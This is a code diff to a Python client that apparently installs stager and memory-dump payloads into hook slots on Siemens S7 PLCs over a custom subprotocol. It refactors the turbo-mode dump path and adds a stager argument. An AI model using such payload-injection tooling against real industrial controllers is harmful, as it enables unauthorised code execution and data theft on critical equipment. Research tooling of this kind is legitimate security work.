@@ -37,6 +37,7 @@ ANSW_INVALID_CHECKSUM = "\xff\x80\x03"
 ANSW_ENTER_SUBPROTO_SUCCESS = "\x80\x00"
 DEFAULT_STAGER_ADDHOOK_IND = 0x20
 DEFAULT_SECOND_ADD_HOOK_IND = 0x1a
+TURBO_STAGER_HOOK_IND = 0x19
 
 # Subprotocol handler constants
 SUBPROT_80_MODE_IRAM = 1
@@ -280,7 +281,6 @@ class SiemensS7Client:
         if args.action == ACTION_DUMP_TURBO:
             # Step 1: Install turbo_stager using the normal stager
             # Use hook 0x19 for turbo_stager itself (not 0x1a, which turbo_stager will use for the final payload)
-            TURBO_STAGER_HOOK_IND = 0x19
             try:
                 with open(TURBO_STAGER_PL_FILENAME, 'rb') as f:
                     turbo_stager_code = f.read()
@@ -296,8 +296,8 @@ class SiemensS7Client:
             )
             log.info("Turbo stager installed at hook 0x{:02x}".format(turbo_stager_addhook_ind))
             
-            # Remember the destination address for the final payload
-            dump_payload_addr = self.next_payload_location
+            # Remember where the dump_mem payload will be installed (not where we're dumping from)
+            payload_install_addr = self.next_payload_location
             
             # Step 2: Invoke turbo_stager - it will send 0xAA to initiate handshake
             log.info("Invoking turbo stager to switch to turbo mode...")
@@ -315,7 +315,7 @@ class SiemensS7Client:
             
             # Step 5: Send the dump_mem payload via turbo mode
             # The turbo_stager will receive it, install it at hook 0x1a, and send 'D'
-            if not self.load_payload_turbo(payload, dump_payload_addr):
+            if not self.load_payload_turbo(payload, payload_install_addr):
                 self.bye()
                 return
             
@@ -328,9 +328,8 @@ class SiemensS7Client:
                 second_addhook_ind = self.install_addhook_via_stager(self.next_payload_location, payload, stager_addhook_ind)
                 log.info("Installing the additional hook took {} seconds".format(time.time() - start))
 
-        # --- Execute final action ---
-        # This part is now common for both turbo and normal mode
-        if args.action == ACTION_INVOKE_HOOK:
+            # --- Execute action for non-turbo modes ---
+            if args.action == ACTION_INVOKE_HOOK:
                 answ = self.invoke_add_hook(second_addhook_ind, args.args)
                 log.info("Got answer: {}".format(answ))
             elif args.action == ACTION_DUMP:
@@ -398,6 +397,8 @@ def main():
 
     # Arguments for dump
     for p in [parser_dump, parser_dump_turbo]:
+        stager_default = TURBO_STAGER_PL_FILENAME if p == parser_dump_turbo else STAGER_PL_FILENAME
+        p.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('r'), default=stager_default)
         p.add_argument('-p', '--payload', type=argparse.FileType('rb'), default=DUMPMEM_PL_FILENAME)
         p.add_argument('-a', '--address', type=lambda x: int(x, 0), required=True)
         p.add_argument('-l', '--length', type=lambda x: int(x, 0), required=True)
